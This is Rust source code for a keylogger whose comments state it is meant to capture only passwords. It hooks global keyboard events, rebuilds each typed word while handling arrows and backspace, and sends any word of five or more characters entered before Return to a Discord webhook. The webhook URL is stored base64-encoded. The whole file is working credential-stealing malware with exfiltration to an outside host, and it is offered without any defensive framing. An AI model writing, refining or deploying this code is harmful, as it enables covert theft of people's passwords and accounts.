// Crate to get cross-platform input events.
// I will replace with winapi if it gets annoying.
use rdev::{EventType, Key};
use reqwest::header::CONTENT_TYPE;
use std::{
    io::Read,
    slice::SliceIndex,
    sync::mpsc::{self, Receiver, Sender},
    time::{Duration, Instant},
};

// change this to your webhook URL
const HOOK_URL: &str = "your webhook in base64";

// This keylogger is aiming to ONLY get passwords through a variety of methods.
// If there is a space key entered, for example, we can ignore the proceding word.
// We could also only get keys entered into a list of programs, such as Chrome.

fn main() -> Result<(), Box<rdev::ListenError>> {
    // a list of modifiers so we can ignore any keyboard shortcuts.
    let modifier_keys = [Key::Alt, Key::AltGr, Key::MetaLeft, Key::MetaRight];
    // how to long to wait if we pressed a modifier
    let timeout = std::time::Duration::from_millis(10);

    // hold the current word that is being typed.
    let mut current_word_buf: Vec<String> = Vec::new();
    // hold the cursor position
    let mut cursor_pos = 0;

    // To check if ctrl was pressed.
    let (tx, rx) = mpsc::channel::<Instant>();
    // To check our keyboard shortcuts.
    let (mod_send, mod_recv) = mpsc::channel::<Instant>();

    rdev::listen(move |event| {
        // keep checking if the timers finished.
        let ctrl_held = timer_done(&rx, timeout);
        let modkey_held = timer_done(&mod_recv, timeout);

        if let EventType::KeyPress(key) = event.event_type {
            if modifier_keys.contains(&key) {
                // if we press a modkey, ignore any typed letters for ~10ms.
                start_timer(mod_send.clone()).unwrap();
            } else {
                // if it wasn't a modifier, check other keys.
                match key {
                    // if we press control key, this starts a timer which writes
                    // false to _ctrl_held after 10ms.
                    Key::ControlLeft | Key::ControlRight => {
                        start_timer(tx.clone()).unwrap();
                    }
                    Key::Return => {
                        // at the least a password will be >= 5 characters.
                        if current_word_buf.len() >= 5 {
                            current_word_buf.append_to_log();
                            current_word_buf.clear();
                            cursor_pos = 0;
                        } else {
                            current_word_buf.clear();
                            cursor_pos = 0;
                        }
                    }
                    Key::Space => {
                        current_word_buf.clear();
                        cursor_pos = 0;
                    }
                    Key::RightArrow => {
                        // Don't move cursor past word.
                        if cursor_pos < current_word_buf.len() {
                            cursor_pos += 1;
                        }
                    }
                    Key::LeftArrow => {
                        // Don't move cursor past word.
                        if ctrl_held && cursor_pos >= 1 {
                            cursor_pos = 0;
                        } else if cursor_pos >= 1 {
                            cursor_pos -= 1;
                        }
                    }

                    // I could do something clever but I won't for now
                    Key::UpArrow => {
                        current_word_buf.clear();
                        cursor_pos = 0;
                    }
                    // This could mean you lose some data but eh
                    Key::DownArrow => {
                        current_word_buf.clear();
                        cursor_pos = 0;
                    }
                    Key::Delete => {}
                    Key::Backspace => {
                        // Check whether to delete the whole word/letters
                        // -- works on Linux too now.
                        // before I was using some difference in keycodes
                        if ctrl_held {
                            current_word_buf.drain(0..cursor_pos);
                            cursor_pos = 0;
                        } else if !current_word_buf.is_empty()
                            && current_word_buf.get(cursor_pos) != Some(&current_word_buf[0])
                            && cursor_pos >= 1
                        {
                            // This handles the backspace key.
                            current_word_buf.remove(cursor_pos - 1);
                            cursor_pos -= 1;
                        }
                        println!("{:?} {}", current_word_buf, ctrl_held);
                    }
                    _ => {
                        let event = event.name;
                        handle_key(
                            event,
                            ctrl_held,
                            modkey_held,
                            &mut cursor_pos,
                            &mut current_word_buf,
                        )
                    }
                }
            }
        }
    })?;

    Ok(())
}

/// Cleans up the main function by moving the code here.
/// There are a lot of params which have to be passed in unfortunately.
fn handle_key(
    event: Option<String>,
    ctrl_held: bool,
    modkey_held: bool,
    cursor_pos: &mut usize,
    current_word_buf: &mut Vec<String>,
) {
    // ignore anything that isn't valid ascii
    if let Some(key) = event {
        // only log ascii characters. and only log if we aren't doing a
        // keyboard shortcut.
        if check_latin_character(&key) && !ctrl_held && !modkey_held {
            // Do something with the key.
            current_word_buf.insert(*cursor_pos, key);
            *cursor_pos += 1;
            println!("{:?} {}", current_word_buf, ctrl_held);
        }
    }
}

/// checks whether or not the key is 'valid'
/// e.g. not a control character.
fn check_latin_character(key: &str) -> bool {
    if let Some(key_byte) = key.bytes().last() {
        // Check if the letter is a simple ASCII char,
        // these are usually the only valid characters in a password.
        if key_byte.is_ascii()
            && key.bytes().last() < Some(127_u8)
            && key.bytes().last() > Some(31_u8)
        {
            return true;
        }
        return false;
    }
    false
}

/// Returns whether a 'timer' on another thread has finished
/// Use to check for modkey and ctrl presses, as well as anything else...
/// Might be overcomplicated but this made sense earlier for whatever reason.
fn timer_done(rx: &Receiver<Instant>, timeout: Duration) -> bool {
    match rx.try_recv() {
        Ok(timer) => timer.elapsed() >= timeout,
        Err(_) => false,
    }
}

/// Starts a timer which sends itself to the main thread.
fn start_timer(tx: Sender<Instant>) -> Result<(), std::sync::mpsc::SendError<Instant>> {
    let start_time = Instant::now();
    tx.send(start_time)?;
    Ok(())
}

/// To make methods that take &self for Vec<String>.
trait VectorExt {
    /// Appends to the log, for now it will be a discord webhook because why not?
    fn append_to_log(&self);
}

impl VectorExt for Vec<String> {
    /// Appends to the log, for now it will be a discord webhook because why not?
    /// TODO: Stop being lazy.
    fn append_to_log(&self) {
        let mut url = String::new();
        base64_url::decode(&HOOK_URL)
            .unwrap()
            .as_slice()
            .read_to_string(&mut url)
            .unwrap();

        let payload = format!("{{\"content\":\"{}\"}}", self.join(""));
        reqwest::blocking::Client::new()
            .post(url)
            .body(payload)
            .header(CONTENT_TYPE, "application/json")
            .send();
    }
}
